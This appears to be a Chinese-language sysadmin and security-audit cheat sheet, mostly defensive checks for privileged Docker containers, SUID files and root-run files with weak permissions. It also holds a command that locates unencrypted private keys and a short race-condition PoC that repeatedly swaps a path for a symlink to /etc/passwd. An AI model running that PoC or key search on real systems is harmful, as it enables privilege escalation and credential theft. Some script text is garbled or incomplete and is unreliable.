## 命令

### 系统检查

#### 查找未加密证书

```bash
find / -name "*.key" 2>/dev/null |xargs grep "BEGIN RSA" |awk -F ':' '{print $1}'|xargs grep -H -E -o -c "ENCRYPTED" |grep ".key:0"
```

#### 查看有无特权容器

```bash
ttt='';for list in $(docker ps -q) ; do temp=`docker inspect --format='{{.HostConfig.Privileged}}' $list 2>/dev/null|grep true`; if [ "$?" == "0" ]; then ttt="$ttt|$list"; fi done; docker ps |egrep ${ttt#?}

ttt=$(docker inspect --format='{{.HostConfig.Privileged}} {{.Name}}' $(docker ps -q)|grep true|awk -F '/' {'print $2'}|tr '\n' '|');docker ps |egrep ${ttt%?}

docker inspect --format='{{.HostConfig.Privileged}} {{.Id}} {{.Name}}' $(docker ps -q)|grep true
```

#### 扫描具有root权限的SUID的文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

### 快捷查找

#### 通过overlay查找对应容器id

```bash
docker ps -q | xargs docker inspect --format '{{.State.Pid}}, {{.Id}}, {{.Name}}, {{.GraphDriver.Data.WorkDir}}' | grep $overlay
```

#### 查看系统基本硬件配置

```bash
echo -e "\n[INFO]CPU" && cat /proc/cpuinfo |grep "model name" |awk '{for(i=1;i<4;i++){$i=""};print $0}' && echo -e "\n[INFO]Mem" && free -mh && echo -e "\n[INFO]Disk" && df -h
```

### 配置

#### 产品环境设置

```bash
export HISTSIZE=5000
export TMOUT=0

alias dkp='docker ps |grep '
alias pss='ps -ef |head -1;ps -ef |grep -v grep|grep '
alias nets='netstat -nlp |grep '
alias md='mkdir -p '
alias ip4='hostname -i'
alias dke='exec(){ docker exec -it $1 /bin/bash; };exec'


alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'


```

### 便捷

#### pip升级所有包

```bash
for i in $(pip list -o|grep '\.'|awk {'print $1'} |grep -v / |grep -v from); do pip install --upgrade $i ; done
```

## 脚本

### 扫描

#### 扫描系统中能以root权限执行的脚本

```bash
#!/bin/bash
# author:l00622265
echo "该脚本目前只支持扫描以root执行的文件和目录，包括扫描sudo列表，定时任务和开机任务，以及动态库权限"

if [ ! -s sudo.txt ];then
    user=`whoami`
    if [ "${user}" != "root" ]; then
        echo "[ERROR]Only root can do the scan work!"
        exit 1
    fi
    
    test -r /etc/sudoers
    if [ "$?" != "0" ]; then
        echo "[ERROR]Fail to read /etc/sudoers!"
        exit 1
    fi

    touch sudo.txt
    if [ "$?" != "0" ]; then
        echo "[ERROR]Fail to create sudo.txt in this file!"
        exit 1
    fi

    # sudo任务
    grep -r "(root" /etc/sudoers* |awk -F '[: ]' {'print $2"\t"$4'}|grep "/"|grep -v ">" >>sudo.txt
    grep -r "(root" /etc/sudoers* |awk -F '[: ]' {'print $2"\t"$5'}|grep "/"|grep -v ">" >>sudo.txt
    
    # ps进程
    ps -f -u root |grep -v "\[" |awk {'print $8"\n"$9'} |grep '/'|grep -v "\-\-" |sort|uniq|awk '{$NF="ps "$NF;print}' >>sudo.txt

    # 定时任务
    grep -r "root " /etc/cron* |awk {'print $7"\n"$8'} |grep "/" |grep -v ">"|awk '{$NF="cron "$NF;print}' >>sudo.txt

    # 开机任务
    egrep -v ">|#" /etc/rc.d/rc.local|awk {'print $1"\n"$2'}|grep "/" |awk '{$NF="rc.local "$NF;print}' >>sudo.txt

    # 动态库
    cat /etc/ld.so.conf.d/* |grep / |uniq|awk '{$NF="ld.so.conf.d "$NF;print}' >>sudo.txt
    
    #这里不知道为啥不能直接>sudo.txt
    #cat sudo.txt |grep -v '^$'|uniq >sudo.txt
    cat sudo.txt |grep -v '^$'|sort|uniq|egrep -v "/bin/sh$"|egrep -v "bash$" >sudo
    rm sudo.txt && mv sudo sudo.txt
    count=`cat sudo.txt|wc -l`
    if [ "${count}" == "0" ]; then
        echo "[ERROR]Can not find any script run by root!"
        rm -f sudo.txt
        exit 0
    fi
    cat sudo.txt |grep -v "ld.so.conf.d"|awk {"print \$2"}|sort|uniq > s_file.txt
    echo "[INFO]`pwd`/sudo.txt and s_file.txt have been created!"
else
    echo "[INFO]`pwd`/sudo.txt is exist, scanning it directly"
fi
if [ ! -s s_file.txt ];then
    cat sudo.txt |grep -v "ld.so.conf.d"|awk {"print \$2"}|sort|uniq > s_file.txt
    echo "[INFO]`pwd`/s_file.txt have been created!"
fi

# 搜索文件是否存在权限错误
flag='0'
for list in $(cat sudo.txt |awk {'print $2'})
do
    if [ ! -e $list ];then
        continue
    fi
    if [ -L $list ];then
            list=$(echo `readlink -f $list`)
    fi
    list=$(ls -ld $list)
    if [ ${list:8:1} = "w" ] || [ $(echo $list|awk '{print $3}') != 'root' ];then
        if [ $flag = '0' ];then
            echo "[WARING]Some file have wrong permission!"
            flag='1'
        fi
        echo $list
    fi
done
if [ $flag = '0' ];then
    echo "[INFO]Can not find file has wrong permission"
fi

# 搜索目录是否存在权限错误
flag='0'
for list in $(cat sudo.txt |awk {'print $2'}|sort |uniq)
do
	while :
	do
        list=$(dirname $list)
        if [ "${list}" == "/" ]; then
            break
        fi
        if [ ! -d $list ];then
            continue
        fi
        if [ -L $list ];then
            list=$(echo `readlink -f $list`)
        fi

        list_t=$(ls -ld $list)
        if [ ${list_t:8:1} = "w" ] || [ $(echo $list_t|awk '{print $3}') != 'root' ];then
            if [ $flag = '0' ];then
                echo "[WARING]Some dictionary have wrong permission!"
                flag='1'
            fi
            echo $list_t
            continue
        fi
    done
done
if [ $flag = '0' ];then
    echo "[INFO]Can not find dictionary has wrong permission"
fi

echo ""
echo "USAGE:"
alias sgrep='cat s_file.txt|xargs grep 2>/dev/null '
alias sgrep
echo 'sgrep "\-exec"'
echo "cat s_file.txt|xargs egrep 2>/dev/null 'chown |chmod ' |grep -v '\-h'"
echo "cat s_file.txt|xargs egrep 2>/dev/null 'bash |/bin/sh '"
# if [ $? != 0 ];then
#     echo "[INFO]Can not find chown or chmod command sue without -h"
# else
#     echo "[WARING]Some chown or chmod command use without -h"
# fior chmod command sue without -h"
# else
#     echo "[WARING]Some chown or chmod command use without -h"
# fi
```

#### 某些文件内容是否包含了某部分字符串

```bash
#!/bin/bash
# author:l00622265
if [ -z $2 ]; then
    echo "[USEAGE]$0 file_file string_file"
    exit 1
fi
for string in $(cat $2)
do
        cat $1 |xargs grep 
done
```

### poc

#### 在条件竞争中删除文件并创建软链接

```bash
#!/bin/bash
# author:l00622265
if [ -z $1 ]; then
    echo "[USEAGE]$0 replace_file"
    exit 1
fi
while ((1))
do
    if [ -f $1 ] || [ -d $1 ];then
        rm -rf $1
    fi
    ln -s /etc/passwd $1
    check=$(readlink $1)
    if [ "$check" == "/etc/passwd" ];then
        echo "[INFO]Create symbolic-linked file successfully!"
        exit 0
    fi
done
```

